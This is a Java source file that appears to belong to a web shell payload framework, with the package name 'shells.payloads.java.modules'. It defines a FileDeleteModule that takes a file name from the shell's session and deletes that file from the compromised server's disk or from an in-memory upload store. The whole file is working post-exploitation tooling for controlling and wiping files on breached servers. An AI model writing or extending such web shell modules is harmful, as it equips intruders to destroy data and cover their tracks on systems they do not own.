package shells.payloads.java.modules;

import java.io.File;
import java.util.Map;

public class FileDeleteModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }

    private Map getSessionTable() {
        if (this.session == null) {
            return null;
        }
        Object value = this.session.get("sessionTable");
        return value instanceof Map ? (Map) value : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String fileName = getString("fileName");
            
            if (fileName != null) {
                /* mem:// is in session (BigFileUploadModule), not a disk path — old code always returned "File does not exist". */
                if (fileName.startsWith("mem://")) {
                    Map sessionTable = this.getSessionTable();
                    if (sessionTable == null) {
                        sessionTable = this.session;
                    }
                    String memKey = fileName;
                    String legacyMemKey = "MEMFS:" + fileName;
                    String sizeKey = memKey + ":size";
                    String legacySizeKey = legacyMemKey + ":size";
                    sessionTable.remove(memKey);
                    sessionTable.remove(legacyMemKey);
                    sessionTable.remove(sizeKey);
                    sessionTable.remove(legacySizeKey);
                    return "ok".getBytes();
                }

                File file = new File(fileName);
                
                if (file.exists()) {
                    if (file.delete()) {
                        return "ok".getBytes();
                    } else {
                        return "Failed to delete file".getBytes();
                    }
                } else {
                    return "File does not exist".getBytes();
                }
            }
            return "Missing fileName".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "deleteFile";
    }
}
